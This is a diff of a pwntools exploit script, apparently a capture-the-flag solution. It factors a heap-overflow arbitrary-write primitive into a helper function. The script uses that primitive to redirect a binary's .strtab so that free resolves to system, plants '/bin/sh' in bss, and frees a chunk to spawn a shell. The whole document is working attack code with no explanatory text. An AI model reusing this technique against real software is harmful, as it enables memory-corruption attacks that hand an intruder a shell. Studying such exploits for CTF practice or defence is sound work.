@@ -20,6 +20,13 @@ def delete(choice):
     io.send('\x03')
     io.send(choice)
 
+def write(addr, data):
+    payload = 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr)
+    update("\x00", chr(len(payload)), payload)
+    update("\x01", chr(len(data)), data)
+
+
+
 def pwn():
     if debug: gdb.attach(io, "break *0x0000000000400B76")
     
@@ -29,24 +36,21 @@ def pwn():
     # change .strtab to 0x602100 
     addr = 0x0000000000601EA8+0x8 # .strtab 
     strtab = 0x0000000000602100
-    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
-    update("\x01", chr(8), p64(strtab))
+    write(addr, p64(strtab))
 
     # change free to system
     addr = strtab+0x5f
     data = "system\x00"
-    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
-    update("\x01", chr(len(data)), data)
+    write(addr, data)
     
     # write /bin/sh to bss
     addr = 0x602200
     data = "/bin/sh\x00"
-    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
-    update("\x01", chr(len(data)), data)
+    write(addr, data)
 
     # overwrite chunk2 to &"/bin/sh"
-    addr = 0x602200
-    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
+    # chunk2 = 0x602200
+    # update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(chunk2))
     
     # free chunk2 call free and getsystem("/bin/sh")
     delete(chr(1))
